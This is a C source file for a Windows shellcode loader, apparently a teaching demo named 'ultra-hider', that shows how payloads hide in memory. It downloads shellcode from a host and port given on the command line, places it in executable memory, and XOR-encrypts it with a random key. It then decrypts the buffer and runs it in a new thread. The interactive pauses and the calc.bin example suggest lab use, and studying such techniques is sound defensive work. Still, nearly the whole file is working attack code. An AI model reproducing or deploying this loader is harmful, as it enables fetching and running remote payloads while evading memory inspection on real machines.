#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <time.h>
#include "encryptor.h"

extern char* download_file(const wchar_t* host, const wchar_t* path, int port, size_t* totalSize);



int main(int argc, char* argv[]) {
    if (argc != 4) {
        printf("Usage: .\\ultra-hider.exe <hostname> <port> <filename>\n");
        printf("Example: .\\ultra-hider.exe localhost 8000 calc.bin\n");
        return -1;
    }

    const char* hostname = argv[1];
    int port = atoi(argv[2]);
    const char* filename = argv[3];

    if (port <= 0 || port > 65535) {
        printf("Invalid port number. Please provide a value between 1 and 65535.\n");
        return -1;
    }

    wchar_t wHost[256];
    wchar_t wPath[256];

    if (mbstowcs(wHost, hostname, sizeof(wHost) / sizeof(wchar_t)) == (size_t)-1) {
        printf("Error converting hostname to wide-character string.\n");
        return -1;
    }

    if (mbstowcs(wPath, filename, sizeof(wPath) / sizeof(wchar_t)) == (size_t)-1) {
        printf("Error converting filename to wide-character string.\n");
        return -1;
    }

        size_t totalSize = 0;
    char* buffer = download_file(wHost, wPath, port, &totalSize);

    if (!buffer || totalSize == 0) {
        printf("Failed to download file.\n");
        return -1;
    }

    // Display the downloaded buffer
    printf("[+] Downloaded buffer (hex):\n");
    for (size_t i = 0; i < totalSize; i++) {
        printf("%02X ", (unsigned char)buffer[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");

    char* dynamic_buffer = (char*)VirtualAlloc(
        NULL,
        totalSize + 1,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    if (!dynamic_buffer) {
        free(buffer);
        return -1;
    }

    memcpy(dynamic_buffer, buffer, totalSize + 1);
    free(buffer);

    // Display the address of the allocated buffer
    printf("[+] Base address of the shellcode: %p\n", (void*)dynamic_buffer);
    printf("[!!] Go ahead and check it out in Process Hacker!\n");

    srand((unsigned int)time(NULL));
    int key = rand() % 256;

    // Encrypt the buffer
    xor_encrypt_decrypt(dynamic_buffer, totalSize + 1, key);

    // Display the encrypted buffer
    printf("[+] Encrypted buffer (hex):\n");
    for (size_t i = 0; i < totalSize; i++) {
        printf("%02X ", (unsigned char)dynamic_buffer[i]);
        if ((i + 1) % 16 == 0) printf("\n");
    }
    printf("\n");

    printf("[+] Encryption complete. Press Enter to decrypt and execute the buffer.\n");
    getchar();

    // Decrypt the buffer
    xor_encrypt_decrypt(dynamic_buffer, totalSize + 1, key);

    printf("[+] Decrypted buffer. Ready to execute. Press Enter to continue.\n");
    getchar();

    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)dynamic_buffer,
        NULL,
        0,
        NULL);

    if (!hThread) {
        printf("Failed to create thread for execution.\n");
        VirtualFree(dynamic_buffer, 0, MEM_RELEASE);
        return -1;
    }

    printf("[+] Executing the buffer. Waiting for the thread to complete...\n");
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);

    VirtualFree(dynamic_buffer, 0, MEM_RELEASE);
    printf("[+] Execution complete. Memory released.\n");

    return 0;
}
